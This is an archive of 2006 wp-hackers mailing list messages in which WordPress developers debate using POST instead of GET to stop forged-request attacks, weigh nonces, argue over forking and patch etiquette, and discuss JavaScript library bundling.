Since WordPress is wisely published under the GPL, any changes I publish 
in any hypothetical fork will be freely available to the core developers 
if they decide to incorporate them. Certainly if I discover any major 
bugs I'll report them to the core. However most of what I want to do are 
changes that the core team have already explicitly rejected. (e.g. 
cookie-free authentication, removing unsafe GETs, requiring PHP 5, etc.)

One problem I have with working on the main trunk is purely practical. I 
am much more productive when using a source code control system of some 
kind, be it CVS or Subversion. Since I'm not a committer on WordPress 
(nor would I expect to be one) writing anything more than a trivial 
patch, requires me to setup my own repository starting from the current 
head. Once I've done that, I'm 50% of the way to a fork anyhow.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From dstewart at atl.lmco.com  Mon Apr 24 14:18:06 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Mon Apr 24 14:22:18 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CD748.30306@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu> <444CCBDE.5050705@atl.lmco.com>
	<444CD748.30306@metalab.unc.edu>
Message-ID: <444CDE1E.1020202@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Elliotte Harold wrote:
> 
> So far they're small things that I need for my site. I see no chance any
> of these would be adopted into the core code base. Some of them
> shouldn't be.
> 

One of us is writing to the wrong list, then.  If they're general
purpose patches that would benefit the community at large, then submit
'em.  If they're not, then it would probably be best to keep the
situation as it was before this thread: with you making changes to your
own code and keeping quiet about it elsewhere, as the benefits are
effectively nil for anyone else.

> Forking is a core principle of open source development. One of the
> reasons we write open source (better yet, free) software is precisely so
> that developers who have different needs or who have different visions
> can explore different options.
> 

No, it isn't a core principle, it's a beneficial side-effect.  Open
Source development leverages network effects incurred by numerous
developers having access to the underlying code.  As is the case in most
well-designed network topologies, barriers (in this case, unresponsive
devs unwilling to commit code volunteered by others) are circumvented
and routed around, usually through forks.  I would argue that this is a
non-ideal solution in most cases (the ideal being that everyone
contributes to the same codebase, making it stronger in the aggregate).

> Since WordPress is wisely published under the GPL, any changes I publish
> in any hypothetical fork will be freely available to the core developers
> if they decide to incorporate them. Certainly if I discover any major
> bugs I'll report them to the core. However most of what I want to do are
> changes that the core team have already explicitly rejected. (e.g.
> cookie-free authentication, removing unsafe GETs, requiring PHP 5, etc.)
> 

This selfishly (on your part) forces the devs to keep track of your
fork, as well as every other WP-related fork out there.  You've turned
core WP development into an ineffecient "pull" model instead of the
preferred "push" one.  The fact of the matter is that you claim to have
coded around the very subject of this extremely long thread, thus you
MUST have code that accomplishes such.  Go to Trac, submit a .diff
attached to a ticket and then let the chips fall where they may.  To
huffily reply that it's the duty of the WP devs to come looking for your
code is the height of arrogance, once again IMNSHO.

> One problem I have with working on the main trunk is purely practical. I
> am much more productive when using a source code control system of some
> kind, be it CVS or Subversion. Since I'm not a committer on WordPress
> (nor would I expect to be one) writing anything more than a trivial
> patch, requires me to setup my own repository starting from the current
> head. Once I've done that, I'm 50% of the way to a fork anyhow.
> 

If that's your bailiwick, hey, go nuts. Local cvs repos are trivial to
set up and maintain (basically, running 'em as if they were RCS repos
for all intents and purposes), but if you want to go to the trouble of
setting up an SVN instance elsewhere and code wrangling others'
submissions, have fun.  Just don't whine that your asynchronously
developed patches haven't been magically backported to WP core.

'Course, this is all just my 0.0162377202 Euros.

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFETN4eN50Q8DVvcvkRAsgsAJ9lVhMMRAwAu3eUGJICXIPvKhK/lACeLmA4
yBZFirIDObNfTzljqchk+eo=
=G+LM
-----END PGP SIGNATURE-----
From r at robm.me.uk  Mon Apr 24 14:21:58 2006
From: r at robm.me.uk (Rob)
Date: Mon Apr 24 14:26:09 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444C1649.3010309@viper007bond.com>
References: <444B8205.8070200@concept64.com>	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>	<e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>
	<444C1649.3010309@viper007bond.com>
Message-ID: <444CDF06.4060804@robm.me.uk>

Viper007Bond wrote:
> Yeah, I was going to suggest moo.fx as well. It's WAY lighter and has 
> all the basic stuff you need without the bloat of stuff you don't.
>
> However, if we do go with a larger package, I'd like to see it split 
> up into smaller files. That way a plugin / admin page / whatever can 
> just call the bits it needs (say AJAX or collapse/expand) rather than 
> the whole, huge ass script.
>
> -Viper
> _________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

Would it not be better to always include all of the JS? That way you 
don't have to work out which elements to include for your particular 
plugin/script, you don't end up including things twice, and there's no 
tangible increase in download times/bandwidth usage because of the caching?

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From false.hopes at gmail.com  Mon Apr 24 14:46:27 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 24 14:50:41 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CC76E.8030907@ebroder.net>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com> <444CC76E.8030907@ebroder.net>
Message-ID: <a491f91d0604240746pdb3209ek491b5f60bd9a9f83@mail.gmail.com>

On 4/24/06, Evan Broder <wp@ebroder.net> wrote:
> Owen Winkler wrote:
> > Does this look reasonable in Safari?  That's where I hear there are
> > problems, though I haven't looked at it there myself yet.
> All buttons are styled as buttons in Safari, regardless of what the CSS
> says. You get pretty looking Aqua buttons for Edit and Delete and a link
> for View. The solution is probably to make all 3 buttons.

Which brings up my original point, this is not a cross browser
solution to make the UI look standard across browsers and consistant
within itself.

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Mon Apr 24 14:54:01 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 24 14:54:02 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
Message-ID: <444CE689.6050202@midnightcircus.com>

Mike Little wrote:
> You've really got a bee in your bonnet about this one, haven't you. Is
> all this aggression necessary?

What irks me is that we've got one or two folks who want to see 
something implemented for what seems like purely academic reasons, and 
they don't care to contribute beyond offering their opinions.  They 
aren't convincing with why their ideas are better than what code has 
already been produced, and they aren't coding anything on their own that 
they are willing to offer to the community.  You're right - I shouldn't 
be giving this discussion the time of day.

> If you want to protest about using POST, then do so for the right reasons.

It's nice when we can apply the standards practically.

I find little practical use for the proposed sweeping changes to POST 
actions, since the only gain we would make is tenuous standards support, 
which according to the excerpts you provided, we already achieve.

Owen




From false.hopes at gmail.com  Mon Apr 24 14:50:17 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 24 14:54:30 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CC938.7040908@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu>
Message-ID: <a491f91d0604240750q2db241f3i691aca850ce51e38@mail.gmail.com>

On 4/24/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Owen Winkler wrote:
>
> > Strange that all of the POST proponents hadn't written a patch for this
> > already - it might have been less overall work than the bluster they've
> > created, and it might already have been committed by now.
>
> Let me repeat myself: experience has taught me that writing patches for
> design flaws is a complete waste of time until the maintainers recognize
> the flaw. While simple fixes for obvious bugs are usually accepted, and
> feature additions are sometimes accepted, architectural changes are
> almost never accepted. This isn't WordPress specific by any means. This
> is a general rule in most open source projects.

For the rest of the contributors to the WordPress project, we have
learned from years of experience that code speaks louder than words,
and 99% of the time, if you want something in, you have to at least
write a preliminary patch.

> At such time as the maintainers decide they want to use POST where
> appropriate, then it makes sense to invest time in creating a patch.
> Until then, the question is not whether to submit a patch. It's whether
> to live with the flaw or fork the project. I personally haven't decided
> yet. Forking is a big step, but not out of the question. I've got a
> growing list of problems with WordPress that can likely only be
> addressed in a separate development branch. I'd certainly prefer not to
> go to all the expense and trouble of maintaining a fork. It's not like I
> don't have enough to unpaid work already; but if the list keeps growing
> then forking may become inevitable.

The question should be "if my patch doesn't get accepted for the wrong
reasons", what should I do tfrom there?

> I've already made a few changes in the code for my personal sites. The
> more changes I make and the further my own codebase diverges from the
> official codebase, the more sense it makes to publish the whole thing,
> and make it official.

Have fun.


--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Mon Apr 24 15:00:49 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 24 15:00:53 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444CDF06.4060804@robm.me.uk>
References: <444B8205.8070200@concept64.com>	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>	<e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>	<444C1649.3010309@viper007bond.com>
	<444CDF06.4060804@robm.me.uk>
Message-ID: <444CE821.8000503@midnightcircus.com>

Rob wrote:
> Would it not be better to always include all of the JS? That way you 
> don't have to work out which elements to include for your particular 
> plugin/script, you don't end up including things twice, and there's no 
> tangible increase in download times/bandwidth usage because of the caching?

Yeah, I was wondering about that.  Why are we trying to out-think 
browser caching?  Using slim libraries seems like a good idea, and 
including only what you need on a per-page basis seems like a good idea, 
but wasting (even minimal) server resources to rebuild different 
combinations of javascript that will likely each be cached separately... 
  Wha?

Owen


From elharo at metalab.unc.edu  Mon Apr 24 15:00:09 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 15:04:44 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CDE1E.1020202@atl.lmco.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>
	<444CCBDE.5050705@atl.lmco.com>	<444CD748.30306@metalab.unc.edu>
	<444CDE1E.1020202@atl.lmco.com>
Message-ID: <444CE7F9.3000300@metalab.unc.edu>

Doug Stewart wrote:

> No, it isn't a core principle, it's a beneficial side-effect.  Open
> Source development leverages network effects incurred by numerous
> developers having access to the underlying code.  As is the case in most
> well-designed network topologies, barriers (in this case, unresponsive
> devs unwilling to commit code volunteered by others) are circumvented
> and routed around, usually through forks.  I would argue that this is a
> non-ideal solution in most cases (the ideal being that everyone
> contributes to the same codebase, making it stronger in the aggregate).
> 

That ideal assumes people want the same thing. Sometimes different 
groups have different needs, and require different products to satisfy 
those needs. One system cannot be everything to every one. NetBSD, 
FreeBSD, and OpenBSD are good examples. They are different projects with 
different motivations and criteria. If you want portability pick NetBSD. 
  If you want security pick OpenBSD. If you want performance on X86, 
pick FreeBSD. Three different products forked form the same code base 
because different people have different needs and criteria for choosing 
an OS.


> This selfishly (on your part) forces the devs to keep track of your
> fork, as well as every other WP-related fork out there.  You've turned
> core WP development into an ineffecient "pull" model instead of the
> preferred "push" one.  The fact of the matter is that you claim to have
> coded around the very subject of this extremely long thread, thus you
> MUST have code that accomplishes such.  Go to Trac, submit a .diff
> attached to a ticket and then let the chips fall where they may.  To
> huffily reply that it's the duty of the WP devs to come looking for your
> code is the height of arrogance, once again IMNSHO.

Point of order: I've claimed no such thing. I have described a 
reasonable prophylatic measure that can be taken within the current code 
base to protect yourself from the two attacks discovered so far. Simply:

1. Don't allow img elements in comments
2. Don't give 3rd parties contributor rights
3. Don't follow 3rd party links from the comment moderation page.

So far, none of this requires a patch; but this is all a kludge we'd 
rather not have to take. It should be possible to give third parties 
contributor rights. It should be safe to follow 3rd party links from the 
admin pages. Making this safe requires changing the code.

The core team seems to want to implement a complex nonce based solution. 
I suspect there's a simpler, more robust solution using POST instead of 
GET. Whether I write the code to implement that solution depends on a 
variety of factors. However when the core team has been quite clear that 
they do not intend to accept a POST solution no matter what, then 
patches are not an option. There's no point in wasting my time and 
theirs cluttering TRAC with patches they've already said they'll reject. 
If they change their minds, I'll submit what I write; but given the 
current situation, the question is not patch or don't patch. The 
question is fork or do nothing.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Mon Apr 24 15:06:23 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 15:10:56 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CE689.6050202@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com>
Message-ID: <444CE96F.7050106@metalab.unc.edu>

Owen Winkler wrote:

> I find little practical use for the proposed sweeping changes to POST 
> actions, since the only gain we would make is tenuous standards support, 
> which according to the excerpts you provided, we already achieve.

There are two major open security holes that would never have happened 
if WordPress used POST instead of GET, and you see little gain?

There are entire sites that have been deleted by spiders and web 
accelerators because they used GET where they should have used POST, and 
you see little gain?

There's a lot more going on here than an obsessive concern with 
standards support. The safety of GET isn't a dusty corner of the HTTP 
spec. It's a core principle of HTTP, and anyone who violates it does so 
at their peril. I strongly suspect the two bugs uncovered so far are not 
the last problems to surface from this mistake.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From robmientjes at gmail.com  Mon Apr 24 15:07:29 2006
From: robmientjes at gmail.com (Rob Mientjes)
Date: Mon Apr 24 15:11:38 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <a491f91d0604240746pdb3209ek491b5f60bd9a9f83@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com> <444CC76E.8030907@ebroder.net>
	<a491f91d0604240746pdb3209ek491b5f60bd9a9f83@mail.gmail.com>
Message-ID: <e8e97f9f0604240807k652f42e0w373795210676e3ee@mail.gmail.com>

On 24/04/06, Robert Deaton <false.hopes@gmail.com> wrote:
> On 4/24/06, Evan Broder <wp@ebroder.net> wrote:
> > Owen Winkler wrote:
> > > Does this look reasonable in Safari?  That's where I hear there are
> > > problems, though I haven't looked at it there myself yet.
> > All buttons are styled as buttons in Safari, regardless of what the CSS
> > says. You get pretty looking Aqua buttons for Edit and Delete and a link
> > for View. The solution is probably to make all 3 buttons.
>
> Which brings up my original point, this is not a cross browser
> solution to make the UI look standard across browsers and consistant
> within itself.

I don't see this as a problem. When I look at Andrew's mock-up in
Safari (as I watch every web thing, really), I see the distinction
between View and Edit and Delete. Maybe Edit could still be GET, but
Delete in its inherent nature as a destructive action deserves visual
distinction, in my eyes.

I don't call this a Safari problem, to respond to Owen. It's, for me
at least, distinction I care about.

-Rob.
From ryan at concept64.com  Mon Apr 24 15:09:52 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 15:14:03 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CE689.6050202@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com>
Message-ID: <444CEA40.30708@concept64.com>

I'm not in agreement either way, but here's a proposed solution for 
getting rid of the GET delete requests:

Drop the buttons for "Delete" completely and make checkboxes for each, 
with a "Delete Posts" submit button on the bottom of the page?  We 
already do this on the Manage Bookmarks page and it's actually more 
user-friendly because you can delete multiple posts/pages at once.  
Plus, it slightly curbs people with Javascript disabled or JS problems 
from accidentally clicking the "Delete" button and with no confirmation 
popup from "poof" post gone, sorry.  And that would also remove the need 
for the AJAX list management code, or we could still use AJAX for the 
form submit...

As for approving comments from emails, either do what Ryan Duff is 
suggesting:

    What about a hash appended to the link that is generated when the
    email is sent? To delete it via a single click it would require the
    hash to match. The other POST method could be used in the admin
    interface for security there.

    The only person that would get the hash would be the email
    recipient, removing the risk of anybody being able to craft a link
    and cause you to delete something with a single click.

Or, we don't allow approving comments from emails, but we provide a link 
to WP Admin where you can (using a POST).  I don't know, I'm all about 
the aesthetically pleasing GUI, but this seems a little trivial for 
something that can be accomplished with REST and still be aesthetically 
pleasing with checkboxes.

Ryan Scheuermann


----
Concept 64, Inc. | Phone: 610.349.0703 | Web: www.concept64.com

From ryan at concept64.com  Mon Apr 24 15:11:35 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 15:15:44 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444CE821.8000503@midnightcircus.com>
References: <444B8205.8070200@concept64.com>	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>	<a491f91d0604231407i3352243fkbfda6f8fa79a94e8@mail.gmail.com>	<e6ec604d0604231439t6fc3e385u15a3085d30efb2ed@mail.gmail.com>	<444C1649.3010309@viper007bond.com>	<444CDF06.4060804@robm.me.uk>
	<444CE821.8000503@midnightcircus.com>
Message-ID: <444CEAA7.2030202@concept64.com>

Owen Winkler wrote:
> Rob wrote:
>> Would it not be better to always include all of the JS? That way you 
>> don't have to work out which elements to include for your particular 
>> plugin/script, you don't end up including things twice, and there's 
>> no tangible increase in download times/bandwidth usage because of the 
>> caching?
>
> Yeah, I was wondering about that.  Why are we trying to out-think 
> browser caching?  Using slim libraries seems like a good idea, and 
> including only what you need on a per-page basis seems like a good 
> idea, but wasting (even minimal) server resources to rebuild different 
> combinations of javascript that will likely each be cached 
> separately...  Wha?
>
> Owen
>
Not only that, it makes code maintenance a hell of a lot easier.

----
Concept 64, Inc. | Phone: 610.349.0703 | Web: www.concept64.com

From robmientjes at gmail.com  Mon Apr 24 15:14:16 2006
From: robmientjes at gmail.com (Rob Mientjes)
Date: Mon Apr 24 15:18:28 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CEA40.30708@concept64.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
Message-ID: <e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>

On 24/04/06, Ryan Scheuermann <ryan@concept64.com> wrote:
> Drop the buttons for "Delete" completely and make checkboxes for each,
> with a "Delete Posts" submit button on the bottom of the page?  We
> already do this on the Manage Bookmarks page and it's actually more
> user-friendly because you can delete multiple posts/pages at once.
> Plus, it slightly curbs people with Javascript disabled or JS problems
> from accidentally clicking the "Delete" button and with no confirmation
> popup from "poof" post gone, sorry.  And that would also remove the need
> for the AJAX list management code, or we could still use AJAX for the
> form submit...
> <snip />
> Or, we don't allow approving comments from emails, but we provide a link
> to WP Admin where you can (using a POST).  I don't know, I'm all about
> the aesthetically pleasing GUI, but this seems a little trivial for
> something that can be accomplished with REST and still be aesthetically
> pleasing with checkboxes.

The question is: is it feasible? I mean, checkboxes are intended for
selected mass... er... selection. Do people really delete three or
fifteen posts at a time? How great is the need for a mass edit
interface with posts, as compared to bookmarks and comments?

-Rob.
From ryan at concept64.com  Mon Apr 24 15:15:08 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 15:19:20 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CEA40.30708@concept64.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>
Message-ID: <444CEB7C.5040301@concept64.com>

Wait a minute, on the Manage Bookmarks page, there is actually a Delete 
link AND a checkbox with a form submit!  Does that seem redundant to 
anyone else?

Ryan Scheuermann

----
Concept 64, Inc. | Phone: 610.349.0703 | Web: www.concept64.com



Ryan Scheuermann wrote:
> I'm not in agreement either way, but here's a proposed solution for 
> getting rid of the GET delete requests:
>
> Drop the buttons for "Delete" completely and make checkboxes for each, 
> with a "Delete Posts" submit button on the bottom of the page?  We 
> already do this on the Manage Bookmarks page and it's actually more 
> user-friendly because you can delete multiple posts/pages at once.  
> Plus, it slightly curbs people with Javascript disabled or JS problems 
> from accidentally clicking the "Delete" button and with no 
> confirmation popup from "poof" post gone, sorry.  And that would also 
> remove the need for the AJAX list management code, or we could still 
> use AJAX for the form submit...
>
> As for approving comments from emails, either do what Ryan Duff is 
> suggesting:
>
>    What about a hash appended to the link that is generated when the
>    email is sent? To delete it via a single click it would require the
>    hash to match. The other POST method could be used in the admin
>    interface for security there.
>
>    The only person that would get the hash would be the email
>    recipient, removing the risk of anybody being able to craft a link
>    and cause you to delete something with a single click.
>
> Or, we don't allow approving comments from emails, but we provide a 
> link to WP Admin where you can (using a POST).  I don't know, I'm all 
> about the aesthetically pleasing GUI, but this seems a little trivial 
> for something that can be accomplished with REST and still be 
> aesthetically pleasing with checkboxes.
>
> Ryan Scheuermann
>
>
> ----
> Concept 64, Inc. | Phone: 610.349.0703 | Web: www.concept64.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From false.hopes at gmail.com  Mon Apr 24 15:13:57 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 24 15:21:50 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CE7F9.3000300@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu> <444CCBDE.5050705@atl.lmco.com>
	<444CD748.30306@metalab.unc.edu> <444CDE1E.1020202@atl.lmco.com>
	<444CE7F9.3000300@metalab.unc.edu>
Message-ID: <a491f91d0604240813q586f7cb9u28213e269d1cf187@mail.gmail.com>

On 4/24/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Doug Stewart wrote:
> The core team seems to want to implement a complex nonce based solution.
> I suspect there's a simpler, more robust solution using POST instead of
> GET. Whether I write the code to implement that solution depends on a
> variety of factors. However when the core team has been quite clear that
> they do not intend to accept a POST solution no matter what, then
> patches are not an option. There's no point in wasting my time and
> theirs cluttering TRAC with patches they've already said they'll reject.
> If they change their minds, I'll submit what I write; but given the
> current situation, the question is not patch or don't patch. The
> question is fork or do nothing.

If there's a more robust solution, we're still waiting to hear it. All
we've heard is some pedantry about the HTTP standard. Matt has
dismissed the idea because, as he sees it (and I must agree), a
solution using POST still needs nonces, and has detrimental
side-effects (can't approve comments from e-mails et al). If you want
to gain approval, write a patch proving him wrong, and if it does what
you say it will, it will most likely be committed, however, if you sit
back while the rest of us patch up with nonces and wait, there will be
no point at all.

>
> --
> Elliotte Rusty Harold  elharo@metalab.unc.edu
> XML in a Nutshell 3rd Edition Just Published!
> http://www.cafeconleche.org/books/xian3/
